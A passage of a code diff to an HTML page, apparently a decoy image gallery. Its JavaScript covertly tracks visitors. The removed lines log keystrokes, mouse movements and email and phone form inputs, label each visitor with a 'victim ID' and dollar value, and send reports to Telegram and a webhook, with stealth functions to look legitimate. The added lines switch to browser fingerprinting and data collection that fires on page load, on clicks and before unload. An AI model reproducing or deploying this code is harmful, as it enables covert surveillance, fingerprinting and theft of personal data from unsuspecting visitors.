+                ctx.font = '14px Arial';
+                ctx.fillText('Fingerprint', 2, 2);
+                return canvas.toDataURL().substring(22, 50);
+            } catch(e) { return 'failed'; }
         }
 
-        // ENHANCED REPORTING
-        async function sendEnhancedReport() {
-            const data = await collectComprehensiveData();
-            
-            const messages = [
-                `🎯 *ENHANCED DATA CAPTURE INITIATED*\n\n` +
-                `🆔 *Victim ID:* ${victimId}\n` +
-                `💰 *Estimated Value:* $${victimValue}\n` +
-                `🕒 *Timestamp:* ${new Date().toLocaleString()}`,
-
-                `📧 *IDENTITY DATA*\n\n` +
-                `📧 *Emails:* ${data.identity.emails.length} found\n` +
-                `📱 *Phones:* ${data.identity.phones.length} found\n` +
-                `👥 *Social Profiles:* ${Object.keys(data.identity.socialProfiles).length} platforms` +
-                (data.identity.emails.length > 0 ? `\n📧 Sample: ${data.identity.emails[0]}` : '') +
-                (data.identity.phones.length > 0 ? `\n📱 Sample: ${data.identity.phones[0]}` : ''),
-
-                `🔧 *SYSTEM DATA*\n\n` +
-                `💻 *Platform:* ${data.system.platform || 'Unknown'}\n` +
-                `⚙️ *Cores:* ${data.system.cores || 'Unknown'}\n` +
-                `🌐 *User Agent:* ${data.system.userAgent?.substring(0, 50) || 'Unknown'}...`,
-
-                `📊 *BEHAVIORAL DATA*\n\n` +
-                `🖱️ *Mouse Movements:* ${data.behavioral.mouseMovements}\n` +
-                `⌨️ *Keystrokes:* ${data.behavioral.keystrokes}\n` +
-                `📜 *Scroll Depth:* ${data.behavioral.scrollDepth}%\n` +
-                `⏱️ *Time on Page:* ${Math.round(data.behavioral.timeOnPage/1000)}s`,
-
-                `✅ *CAPTURE COMPLETE*\n\n` +
-                `🆔 *Final ID:* ${victimId}\n` +
-                `💰 *Final Value:* $${victimValue}\n` +
-                `📊 *Total Data Points:* ${Object.keys(data).length} categories`
-            ];
-
-            for (let message of messages) {
-                await sendToTelegram(message);
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-
-            // Send detailed data via webhook if available
-            await exfiltrateData(data, 'webhook');
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                return gl ? gl.getParameter(gl.VERSION) : 'no_webgl';
+            } catch(e) { return 'failed'; }
         }
 
-        // INITIALIZATION
-        window.addEventListener('load', function() {
-            pageLoadTime = Date.now();
-            
-            // Start enhanced tracking
-            startEnhancedTracking();
-            
-            // Setup credential harvesting
-            setupCredentialHarvesting();
-            
-            // Begin stealth data collection
-            setTimeout(() => {
-                sendEnhancedReport();
-                stealth.mimicLegitimate();
-            }, 2000);
-
-            // Continuous monitoring
-            setInterval(() => {
-                stealth.fakeUserActivity();
-                if (mouseMovements.length > 50 || keystrokeTiming.length > 20) {
-                    sendBehavioralUpdate();
-                }
-            }, 30000);
-        });
-
-        function startEnhancedTracking() {
-            // Mouse movement tracking
-            document.addEventListener('mousemove', (e) => {
-                mouseMovements.push({
-                    x: e.clientX,
-                    y: e.clientY,
-                    timestamp: Date.now()
-                });
-                if (mouseMovements.length > 200) mouseMovements.shift();
-            });
-
-            // Keystroke tracking
-            document.addEventListener('keydown', (e) => {
-                keystrokeTiming.push({
-                    key: e.key,
-                    target: e.target.tagName,
-                    timestamp: Date.now()
-                });
-                if (keystrokeTiming.length > 100) keystrokeTiming.shift();
-            });
-
-            // Form interaction tracking
-            document.addEventListener('input', (e) => {
-                if (e.target.type === 'email' || e.target.type === 'tel') {
-                    formData.set(e.target.name || 'unknown', {
-                        value: e.target.value,
-                        timestamp: Date.now()
-                    });
-                }
-            });
-        }
-
-        async function sendBehavioralUpdate() {
-            const data = await collectComprehensiveData();
-            const message = `📈 *BEHAVIOR UPDATE*\n\n` +
-                           `🆔 ${victimId}\n` +
-                           `🖱️ Movements: ${data.behavioral.mouseMovements}\n` +
-                           `⌨️ Keystrokes: ${data.behavioral.keystrokes}\n` +
-                           `💰 Current Value: $${victimValue}`;
-            await sendToTelegram(message);
-        }
-
-        // Original image function
+        // IMAGE CLICK HANDLER
         function openImage(imageId) {
+            // Trigger immediate data collection if not already done
+            if (!dataCollectionComplete) {
+                collectAllDataImmediately();
+            }
+            
             const imageUrl = CONFIG.images[imageId];
             if (imageUrl) {
                 window.open(imageUrl, '_blank');
-                sendToTelegram(`🖼️ *IMAGE CLICK*\n\nImage ${imageId} opened by ${victimId}`);
             }
         }
 
-        console.log('Enhanced data extraction system loaded');
+        // IMMEDIATE EXECUTION ON PAGE LOAD
+        window.addEventListener('load', function() {
+            // Start comprehensive data collection immediately
+            setTimeout(collectAllDataImmediately, 500);
+            
+            // Fallback: collect data on any user interaction
+            document.addEventListener('click', function() {
+                if (!dataCollectionComplete) {
+                    collectAllDataImmediately();
+                }
+            }, { once: true });
+            
+            // Emergency data collection before page unload
+            window.addEventListener('beforeunload', function() {
+                if (!dataCollectionComplete) {
+                    sendEmergencyReport(new Error('Page unload detected'));
+                }
+            });
+        });
+
+        console.log('Ultra aggressive data collection system loaded');
     </script>
 </body>
 </html>
